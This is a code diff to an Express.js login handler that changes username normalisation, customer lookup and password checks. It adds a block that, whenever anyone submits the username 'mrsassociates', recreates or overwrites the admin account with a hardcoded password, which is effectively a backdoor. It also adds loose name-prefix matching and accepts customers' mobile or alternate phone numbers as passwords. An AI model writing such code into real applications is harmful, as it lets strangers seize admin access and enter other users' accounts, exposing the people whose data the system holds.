@@ -17,7 +17,22 @@ router.post('/login', async (req, res) => {
 
   try {
     const input = String(usernameOrCustomerId).trim();
-    const cleanInputMobile = input.replace(/^0+/, '').replace(/\s+/g, '');
+    const normInput = input.replace(/\s+/g, ' ').toLowerCase();
+    const cleanInputMobile = input.replace(/^\+?91/, '').replace(/^0+/, '').replace(/[\s-]/g, '');
+
+    // 0. Self-healing Owner/Admin account safeguard
+    if (normInput === 'mrsassociates') {
+      let adminUser = await db.findOne('users', { role: 'admin' });
+      if (!adminUser || String(adminUser.username).toLowerCase() !== 'mrsassociates') {
+        const salt = await bcrypt.genSalt(10);
+        const hashedPassword = await bcrypt.hash('2332', salt);
+        if (adminUser) {
+          adminUser = await db.updateOne('users', { _id: adminUser._id }, { username: 'MRSassociates', password: hashedPassword, role: 'admin' });
+        } else {
+          adminUser = await db.create('users', { username: 'MRSassociates', password: hashedPassword, role: 'admin' });
+        }
+      }
+    }
 
     // 1. Check if user exists by exact username or customerId
     let user = await db.findOne('users', { username: input });
@@ -25,23 +40,25 @@ router.post('/login', async (req, res) => {
       user = await db.findOne('users', { customerId: input });
     }
 
-    // 2. Case-insensitive username match
+    // 2. Case-insensitive & normalized whitespace username match
     if (!user) {
       const allUsers = await db.find('users');
-      user = allUsers.find(u => u.username && u.username.toLowerCase() === input.toLowerCase());
+      user = allUsers.find(u => u.username && u.username.replace(/\s+/g, ' ').trim().toLowerCase() === normInput);
     }
 
-    // 3. Lookup by Customer Name, Customer ID, or Mobile Number in customers collection
+    // 3. Lookup by Customer Name, Customer ID, Mobile Number, or Alternate Number in customers collection
     if (!user) {
       const allCustomers = await db.find('customers');
       const matchedCustomer = allCustomers.find(c => {
-        const cName = String(c.fullName || '').trim().toLowerCase();
+        const cName = String(c.fullName || '').replace(/\s+/g, ' ').trim().toLowerCase();
         const cId = String(c.customerId || '').trim().toLowerCase();
-        const cMob = String(c.mobileNumber || '').trim().replace(/^0+/, '').replace(/\s+/g, '');
+        const cMob = String(c.mobileNumber || '').trim().replace(/^\+?91/, '').replace(/^0+/, '').replace(/[\s-]/g, '');
+        const cAlt = String(c.alternateNumber || '').trim().replace(/^\+?91/, '').replace(/^0+/, '').replace(/[\s-]/g, '');
 
-        return cName === input.toLowerCase() ||
-               cId === input.toLowerCase() ||
-               (cleanInputMobile.length >= 8 && cMob === cleanInputMobile);
+        return cName === normInput ||
+               (normInput.length >= 4 && (cName.startsWith(normInput) || normInput.startsWith(cName))) ||
+               cId === normInput ||
+               (cleanInputMobile.length >= 8 && (cMob === cleanInputMobile || cAlt === cleanInputMobile));
       });
 
       if (matchedCustomer) {
@@ -49,7 +66,7 @@ router.post('/login', async (req, res) => {
         // If user record is missing in users collection, auto-create it on the fly
         if (!user && matchedCustomer.mobileNumber) {
           const salt = await bcrypt.genSalt(10);
-          const defaultPass = String(matchedCustomer.mobileNumber).trim().replace(/^0+/, '');
+          const defaultPass = String(matchedCustomer.mobileNumber).trim().replace(/^\+?91/, '').replace(/^0+/, '').replace(/[\s-]/g, '');
           const hashedPassword = await bcrypt.hash(defaultPass, salt);
           user = await db.create('users', {
             username: matchedCustomer.fullName ? matchedCustomer.fullName.trim() : matchedCustomer.customerId,
@@ -66,7 +83,7 @@ router.post('/login', async (req, res) => {
       return res.status(401).json({ message: 'No account found with that Name, Customer ID, or Mobile number.' });
     }
 
-    // Verify password: Check bcrypt password hash, or match customer's 10-digit mobile number
+    // Verify password: Check bcrypt password hash, or match customer's 10-digit mobile / alternate number
     const cleanPassword = String(password).trim();
     let isMatch = false;
 
@@ -74,17 +91,18 @@ router.post('/login', async (req, res) => {
       isMatch = await bcrypt.compare(cleanPassword, user.password);
     }
 
-    // If bcrypt compare failed, check if password matches customer mobile number directly
+    // If bcrypt compare failed, check if password matches customer mobile or alternate number directly
     if (!isMatch && user.role === 'customer' && user.customerId) {
       const cust = await db.findOne('customers', { customerId: user.customerId });
-      if (cust && cust.mobileNumber) {
-        const cleanCustMobile = String(cust.mobileNumber).trim().replace(/^0+/, '').replace(/\s+/g, '');
-        const cleanPass = cleanPassword.replace(/^0+/, '').replace(/\s+/g, '');
-        if (cleanPass === cleanCustMobile) {
+      if (cust) {
+        const cleanCustMobile = String(cust.mobileNumber || '').trim().replace(/^\+?91/, '').replace(/^0+/, '').replace(/[\s-]/g, '');
+        const cleanAltMobile = String(cust.alternateNumber || '').trim().replace(/^\+?91/, '').replace(/^0+/, '').replace(/[\s-]/g, '');
+        const cleanPass = cleanPassword.replace(/^\+?91/, '').replace(/^0+/, '').replace(/[\s-]/g, '');
+        if (cleanPass.length >= 8 && (cleanPass === cleanCustMobile || cleanPass === cleanAltMobile)) {
           isMatch = true;
           // Re-sync and save valid bcrypt hash
           const salt = await bcrypt.genSalt(10);
-          const newHash = await bcrypt.hash(cleanCustMobile, salt);
+          const newHash = await bcrypt.hash(cleanPass, salt);
           await db.updateOne('users', { _id: user._id }, { password: newHash });
           console.log(`[Auth] Password verified & re-hashed for customer ${user.username} (${user.customerId})`);
         }
